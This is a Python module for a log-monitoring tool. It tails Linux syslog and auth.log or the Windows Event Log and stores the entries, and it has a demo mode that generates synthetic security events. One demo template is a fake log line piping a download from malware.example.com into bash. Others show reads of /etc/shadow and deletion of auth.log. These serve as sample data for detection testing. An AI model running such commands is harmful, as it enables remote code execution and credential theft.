"""
log_tailer.py — Async log ingestion engine.

Supports:
  • Linux real-mode: tails /var/log/syslog and /var/log/auth.log
  • Windows real-mode: reads Windows Event Log via pywin32
  • DEMO_MODE: generates realistic fake security events every 2-3 seconds
"""

from __future__ import annotations

import asyncio
import platform
import random
import re
import sys
import uuid
from datetime import datetime, timezone
from typing import TYPE_CHECKING

from app.config import DEMO_MODE, get_supabase

if TYPE_CHECKING:
    from app.websocket.manager import ConnectionManager

# ── parser ────────────────────────────────────────────────────────────────────

SYSLOG_PATTERN = re.compile(
    r"^(?P<month>\w{3})\s+(?P<day>\d+)\s+(?P<time>\d{2}:\d{2}:\d{2})\s+"
    r"(?P<host>\S+)\s+(?P<process>[^\[:\s]+)(?:\[(?P<pid>\d+)\])?:\s+(?P<message>.+)$"
)

MONTH_MAP = {
    "Jan": 1, "Feb": 2, "Mar": 3, "Apr": 4, "May": 5, "Jun": 6,
    "Jul": 7, "Aug": 8, "Sep": 9, "Oct": 10, "Nov": 11, "Dec": 12,
}


def parse_syslog_line(line: str, source_file: str) -> dict | None:
    line = line.strip()
    if not line:
        return None

    m = SYSLOG_PATTERN.match(line)
    now = datetime.now(timezone.utc)

    if m:
        try:
            ts = now.replace(
                month=MONTH_MAP.get(m.group("month"), now.month),
                day=int(m.group("day")),
                hour=int(m.group("time").split(":")[0]),
                minute=int(m.group("time").split(":")[1]),
                second=int(m.group("time").split(":")[2]),
                microsecond=0,
            )
        except (ValueError, KeyError):
            ts = now

        return {
            "timestamp": ts.isoformat(),
            "source_file": source_file,
            "raw_message": line,
            "parsed_fields": {
                "host": m.group("host"),
                "process": m.group("process"),
                "pid": m.group("pid"),
                "message": m.group("message"),
                "severity": _infer_severity(m.group("message")),
            },
        }

    # Fallback: unparsed line
    return {
        "timestamp": now.isoformat(),
        "source_file": source_file,
        "raw_message": line,
        "parsed_fields": {
            "host": "unknown",
            "process": "unknown",
            "pid": None,
            "message": line,
            "severity": "INFO",
        },
    }


def _infer_severity(message: str) -> str:
    msg_lower = message.lower()
    if any(w in msg_lower for w in ("fail", "error", "denied", "invalid", "refused", "attack")):
        return "ERROR"
    if any(w in msg_lower for w in ("warn", "unable", "disconnect", "timeout")):
        return "WARNING"
    if any(w in msg_lower for w in ("accepted", "opened", "success", "started")):
        return "INFO"
    return "INFO"


# ── demo event generator ──────────────────────────────────────────────────────

_FAKE_IPS = [
    "192.168.1.105", "10.0.0.23", "172.16.4.88",
    "203.0.113.42", "198.51.100.7", "45.33.32.156",
    "185.220.101.34", "194.165.16.11", "91.108.4.180",
]

_FAKE_USERS = ["admin", "root", "ubuntu", "ec2-user", "deploy", "git", "postgres", "alice", "bob"]
_FAKE_HOSTS = ["prod-web-01", "db-primary", "bastion", "vpn-gw", "k8s-node-3"]

_DEMO_TEMPLATES = [
    # SSH brute force
    ("auth.log",  "sshd",   "Failed password for {user} from {ip} port {port} ssh2"),
    ("auth.log",  "sshd",   "Invalid user {user} from {ip} port {port}"),
    ("auth.log",  "sshd",   "Received disconnect from {ip} port {port}:11: Bye Bye"),
    # Successful auth
    ("auth.log",  "sshd",   "Accepted publickey for {user} from {ip} port {port} ssh2: RSA SHA256:abc123"),
    # Sudo / privilege escalation
    ("auth.log",  "sudo",   "{user} : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash"),
    ("auth.log",  "sudo",   "{user} : command not allowed ; TTY=pts/1 ; PWD=/home/{user} ; COMMAND=/usr/bin/passwd root"),
    # Cron / service
    ("syslog",    "cron",   "(root) CMD (/usr/lib/apt/apt.systemd.daily)"),
    ("syslog",    "systemd","Started Session {pid} of user {user}."),
    # Network / firewall
    ("syslog",    "kernel", "UFW BLOCK IN=eth0 OUT= MAC=de:ad:be:ef SRC={ip} DST=10.0.0.1 LEN=52 TOS=0x00 PREC=0x00 TTL=45 ID=0 DF PROTO=TCP SPT={port} DPT=22 WINDOW=29200 RES=0x00 SYN URGP=0"),
    ("syslog",    "kernel", "UFW ALLOW IN=eth0 OUT= SRC={ip} DST=10.0.0.1 PROTO=TCP DPT=443"),
    # File access
    ("syslog",    "auditd", "type=SYSCALL msg=audit(1714000000.000:1): arch=x86_64 syscall=openat success=yes exit=3 exe=/usr/bin/cat path=/etc/shadow"),
    ("syslog",    "auditd", "type=SYSCALL msg=audit(1714000000.000:2): arch=x86_64 syscall=unlink success=yes exit=0 exe=/bin/rm path=/var/log/auth.log"),
    # Process anomaly
    ("syslog",    "kernel", "Out of memory: Kill process {pid} (cryptominer) score 850 or sacrifice child"),
    ("syslog",    "bash",   "{user} ran: curl -s http://malware.example.com/payload.sh | bash"),
    # Normal activity
    ("syslog",    "sshd",   "Server listening on 0.0.0.0 port 22."),
    ("syslog",    "ntpd",   "ntp engine ready"),
    ("syslog",    "rsyslogd","rsyslogd's groupid changed to 104"),
]


def _make_demo_entry() -> dict:
    source, process, template = random.choice(_DEMO_TEMPLATES)
    ip = random.choice(_FAKE_IPS)
    user = random.choice(_FAKE_USERS)
    host = random.choice(_FAKE_HOSTS)
    port = random.randint(49152, 65535)
    pid = random.randint(1000, 65000)
    now = datetime.now(timezone.utc)

    message = template.format(ip=ip, user=user, host=host, port=port, pid=pid)

    month_abbr = now.strftime("%b")
    day = now.strftime("%e").strip()
    time_str = now.strftime("%H:%M:%S")
    raw = f"{month_abbr} {day:>2} {time_str} {host} {process}[{pid}]: {message}"

    return {
        "timestamp": now.isoformat(),
        "source_file": source,
        "raw_message": raw,
        "parsed_fields": {
            "host": host,
            "process": process,
            "pid": str(pid),
            "message": message,
            "severity": _infer_severity(message),
        },
    }


# ── insertion helper ──────────────────────────────────────────────────────────

async def _insert_log(entry: dict) -> str | None:
    """Insert a log entry into Supabase; returns the new row id."""
    loop = asyncio.get_event_loop()
    try:
        supabase = get_supabase()
        result = await loop.run_in_executor(
            None,
            lambda: supabase.table("log_entries").insert(entry).execute(),
        )
        if result.data:
            return result.data[0]["id"]
    except Exception as exc:
        print(f"[log_tailer] DB insert error: {exc}", file=sys.stderr)
    return None


# ── tailer coroutines ─────────────────────────────────────────────────────────

async def _tail_file(path: str, ws_manager: "ConnectionManager", analyze_fn) -> None:
    """Async tail a file; call analyze_fn for each new line."""
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            f.seek(0, 2)  # seek to end
            print(f"[log_tailer] Tailing {path}")
            while True:
                line = f.readline()
                if line:
                    entry = parse_syslog_line(line, path.split("/")[-1])
                    if entry:
                        log_id = await _insert_log(entry)
                        if log_id:
                            entry["id"] = log_id
                            await ws_manager.broadcast(
                                {"type": "log_ingested", "data": entry}
                            )
                            asyncio.create_task(analyze_fn(log_id, entry))
                else:
                    await asyncio.sleep(0.2)
    except FileNotFoundError:
        print(f"[log_tailer] File not found: {path}", file=sys.stderr)
    except Exception as exc:
        print(f"[log_tailer] Error tailing {path}: {exc}", file=sys.stderr)


async def _tail_windows_eventlog(ws_manager: "ConnectionManager", analyze_fn) -> None:
    """Read Windows Application/Security/System event log using pywin32."""
    try:
        import win32evtlog  # type: ignore
        import win32evtlogutil  # type: ignore
        import pywintypes  # type: ignore
    except ImportError:
        print("[log_tailer] pywin32 not installed — falling back to demo mode.", file=sys.stderr)
        await _demo_loop(ws_manager, analyze_fn)
        return

    sources = ["Application", "Security", "System"]
    seen_ids: set[int] = set()

    print("[log_tailer] Reading Windows Event Log …")
    while True:
        for source in sources:
            try:
                hand = win32evtlog.OpenEventLog(None, source)
                flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
                events = win32evtlog.ReadEventLog(hand, flags, 0)
                win32evtlog.CloseEventLog(hand)
                for ev in (events or []):
                    if ev.RecordNumber in seen_ids:
                        continue
                    seen_ids.add(ev.RecordNumber)
                    try:
                        msg = win32evtlogutil.SafeFormatMessage(ev, source)
                    except Exception:
                        msg = str(ev.StringInserts or "")
                    raw = f"{ev.TimeGenerated} {source} EventID={ev.EventID} {msg[:300]}"
                    ts = ev.TimeGenerated.Format("%Y-%m-%dT%H:%M:%S+00:00")
                    entry = {
                        "timestamp": ts,
                        "source_file": f"Windows/{source}",
                        "raw_message": raw,
                        "parsed_fields": {
                            "host": "localhost",
                            "process": source,
                            "pid": str(ev.EventID),
                            "message": msg[:300],
                            "severity": _infer_severity(msg),
                        },
                    }
                    log_id = await _insert_log(entry)
                    if log_id:
                        entry["id"] = log_id
                        await ws_manager.broadcast({"type": "log_ingested", "data": entry})
                        asyncio.create_task(analyze_fn(log_id, entry))
            except Exception as exc:
                print(f"[log_tailer] EventLog error ({source}): {exc}", file=sys.stderr)
        await asyncio.sleep(5)


async def _demo_loop(ws_manager: "ConnectionManager", analyze_fn) -> None:
    """Generate synthetic log events for demo/testing."""
    print("[log_tailer] DEMO MODE active — generating synthetic events …")
    while True:
        entry = _make_demo_entry()
        log_id = await _insert_log(entry)
        if log_id:
            entry["id"] = log_id
            await ws_manager.broadcast({"type": "log_ingested", "data": entry})
            asyncio.create_task(analyze_fn(log_id, entry))
        await asyncio.sleep(random.uniform(2.0, 3.5))


# ── public entry point ────────────────────────────────────────────────────────

async def start_log_tailer(ws_manager: "ConnectionManager", analyze_fn) -> None:
    """
    Start the appropriate log ingestion backend based on OS and DEMO_MODE.
    This coroutine runs indefinitely as a background asyncio task.
    """
    if DEMO_MODE:
        await _demo_loop(ws_manager, analyze_fn)
        return

    os_name = platform.system()
    if os_name == "Linux":
        log_files = ["/var/log/syslog", "/var/log/auth.log"]
        tasks = [
            asyncio.create_task(_tail_file(p, ws_manager, analyze_fn))
            for p in log_files
        ]
        await asyncio.gather(*tasks)
    elif os_name == "Windows":
        await _tail_windows_eventlog(ws_manager, analyze_fn)
    else:
        # macOS or other Unix — try common paths
        for path in ["/var/log/system.log", "/var/log/syslog"]:
            import os
            if os.path.exists(path):
                await _tail_file(path, ws_manager, analyze_fn)
                return
        print("[log_tailer] No supported log file found — falling back to DEMO MODE.")
        await _demo_loop(ws_manager, analyze_fn)
